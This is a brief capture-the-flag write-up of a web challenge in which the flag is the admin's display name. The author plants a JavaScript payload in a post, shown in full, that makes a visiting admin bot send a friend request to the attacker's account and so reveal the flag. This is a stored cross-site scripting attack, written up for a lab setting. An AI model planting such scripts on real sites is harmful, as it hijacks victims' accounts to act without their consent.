Registering to service

[Here](https://gist.github.com/darkcheftar/a0746f59bacf8d8d491ad60ce0e45d22) is the source code provided 

From source code we can see that the flag is the display name of admin

And we can only see if admin adds us as a friend

As we can see the we can add someone as a friend by making a post request

to /friend with our username

so we create a post with the below js payload
```js
fetch("/friend", 
{
     method: "POST", 
     body: "username=" + encodeURIComponent("darkcheftar"), 
     headers: { "Content-Type": "application/x-www-form-urlencoded" } 
}).then(e => e.text().then(t => { 
        if (200 !== e.status) { 
            document.querySelector(".error")?.remove(); 
            let r = document.createElement("p"); 
            r.innerText = t, 
            r.classList.add("error"), 
            document.body.insertAdjacentElement("afterbegin", r) 
        } 
        else location.reload() 
}))
```
by sharing the link to the admin bot he adds us as a friend.

now we can see the flag
